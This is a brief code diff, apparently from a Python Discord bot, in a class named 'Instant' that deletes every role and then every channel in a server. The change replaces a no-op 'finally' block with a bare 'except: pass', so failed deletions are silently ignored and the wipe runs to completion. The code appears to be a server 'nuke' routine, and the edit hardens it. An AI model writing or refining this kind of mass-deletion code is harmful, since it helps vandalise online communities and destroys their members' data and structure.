@@ -14,8 +14,8 @@ class Instant:
         for rol in all_role:
             try:
                 await rol.delete()
-            finally:
-                a = "a"
+            except:
+                pass
 
         for chan in ctx.guild.channels:
             await chan.delete()
